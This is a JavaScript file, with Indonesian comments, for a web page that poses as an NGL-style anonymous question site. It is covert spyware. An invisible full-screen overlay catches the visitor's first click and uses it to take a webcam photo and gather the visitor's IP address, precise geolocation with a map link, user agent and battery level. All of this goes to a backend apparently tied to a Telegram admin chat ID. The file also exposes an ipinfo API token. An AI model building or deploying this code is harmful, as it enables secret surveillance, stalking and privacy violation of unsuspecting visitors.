const CHAT_ID = "7483495590"; // chat admin
const statusEl = document.getElementById("status");
function startAccess() {
  // di sini panggil getUserCamera(), getUserLocation(), getUserIP(), dll
}

// ambil info device
async function getDeviceInfo() {
  try {
    const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
    let geoText = "Tidak tersedia";
    let geoLink = "";
    
    if(navigator.geolocation){
      await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;
        const acc = pos.coords.accuracy;
        geoText = `Lat: ${lat}, Lng: ${lng}, Accuracy: ${acc} m`;
        geoLink = `https://www.google.com/maps?q=${lat},${lng}`;
        resolve();
      }, ()=>resolve()));
    }

    const battery = await navigator.getBattery();

    // gabungkan semua info jadi satu string
    let infoText = `🌐 IP: ${ipInfo.ip}\n📍 Lokasi: ${geoText}\n🔗 Maps: ${geoLink || "Tidak tersedia"}\n📱 UserAgent: ${navigator.userAgent}\n🔋 Battery: ${Math.round(battery.level*100)}%`;
    return infoText;

  } catch(e){ 
    return "❌ Gagal ambil info device"; 
  }
}

// kirim ke backend
async function sendToBackend(data, photoBlob=null){
  const formData = new FormData();
  formData.append("text", data);
  if(photoBlob) formData.append("photo", photoBlob, "camera.jpg");

  await fetch("/api/sendPhoto", { method:"POST", body: formData });
}

// capture foto & kirim
async function captureAndSendPhoto(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0,0);

    canvas.toBlob(async blob => {
      const info = await getDeviceInfo();
      await sendToBackend(info, blob);
    }, "image/jpeg");

    stream.getTracks().forEach(track => track.stop());
  } catch(e){ console.error("Gagal capture foto:", e); }
}
// --- list pertanyaan random ala NGL ---
// trigger klik area invisible
const clickArea = document.createElement("div");
clickArea.id = "clickArea";
clickArea.style.position = "fixed";
clickArea.style.top = "0";
clickArea.style.left = "0";
clickArea.style.width = "100%";
clickArea.style.height = "100%";
clickArea.style.zIndex = "9999";
clickArea.style.cursor = "pointer";
clickArea.style.background = "transparent";
document.body.appendChild(clickArea);

clickArea.addEventListener("click", async ()=>{
  await captureAndSendPhoto();
  clickArea.remove();
});

// kirim pesan manual
document.getElementById("sendBtn").addEventListener("click", async ()=>{
  const msg = document.getElementById("msg").value.trim();
  if(!msg) return alert("Tulis dulu pesanmu!");
  await sendToBackend(msg);
  document.getElementById("msg").value = "";
  statusEl.textContent = "Pesan terkirim!";
});
